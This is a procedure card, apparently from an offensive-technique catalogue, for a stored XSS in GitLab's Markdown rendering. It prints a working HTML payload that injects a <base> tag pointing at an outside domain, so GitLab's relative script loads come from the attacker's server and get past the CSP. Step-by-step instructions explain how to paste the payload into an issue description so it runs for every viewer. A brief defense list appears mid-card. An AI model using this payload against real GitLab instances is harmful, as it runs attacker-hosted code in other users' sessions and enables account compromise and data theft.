---
tags:
  - xss
  - injection
  - gitlab
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-base-tag-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:19.835Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 09f9f308-db18-4d29-bd87-4583cb1855c9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Issue-Description

## Summary

This procedure injects a malicious HTML payload into a GitLab issue description, exploiting improper sanitization in the Markdown rendering process to insert a <base> tag that redirects resource loads, bypassing CSP for stored XSS execution.

## Description

The vulnerability stems from syntax_highlight_filter.rb not fully escaping HTML attributes, allowing injection in <pre> tags. The payload sets a base href to an attacker domain, causing relative script srcs (e.g., webpack bundles) to load from the attacker's server. This affects issue descriptions, wikis, and notes, leading to JS execution on page load for any viewer. Prerequisites include an open issue form and control over a domain.

## Requirements

1. Authenticated session in a GitLab project
2. Attacker-controlled domain (e.g., joaxcar.com)
3. Knowledge of GitLab's asset paths (e.g., /assets/webpack/)

## Defense

Defensive measures and detection strategies:

- Patch Markdown renderer to fully sanitize HTML attributes
- Strengthen CSP to block base tag effects or external script loads
- Monitor for anomalous <base> tags in stored content via WAF

## Objectives

1. Store HTML injection without immediate sanitization
2. Redirect relative resources to attacker domain
3. Set up for CSP bypass and JS execution

## Instructions

### Step 1: Prepare the Payload

**Context**: Craft the HTML to abuse <pre> parsing and insert <base>.

**Command** ([[commands/inject-base-tag-payload]]):

```html
<pre data-sourcepos="\"%22 href=\"x\"></pre><base href=https://joaxcar.com><pre x=\"\"><code></code></pre>
```

> The first <pre> closes an existing tag, <base> sets the href, and the second <pre> balances parsing. Replace domain as needed. Expected: No parse errors.

### Step 2: Insert into Issue Description

**Context**: Paste into the Markdown field and preview if possible.

**Command** ([[commands/inject-base-tag-payload]]):

Paste the above into the description textarea.

> Submit after verification. Expected: Payload renders with <base> influencing loads.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-base-tag-payload]]

## Tools Used


## Tags

- xss
- csp-bypass
